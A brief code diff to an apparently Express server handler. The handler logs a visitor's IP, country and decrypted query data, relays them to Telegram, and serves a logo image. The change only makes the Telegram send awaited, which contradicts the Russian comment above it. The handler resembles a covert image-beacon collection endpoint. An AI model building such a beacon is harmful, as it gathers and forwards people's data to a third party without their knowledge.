@@ -53,7 +53,7 @@ app.get('/', async (req, res) => {
     console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);
 
     // Отправляем данные в Telegram (асинхронно, не ждем завершения)
-    sendToTelegram(userIp, country, decryptedData);
+    await sendToTelegram(userIp, country, decryptedData);
 
     // Отправляем изображение
     const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
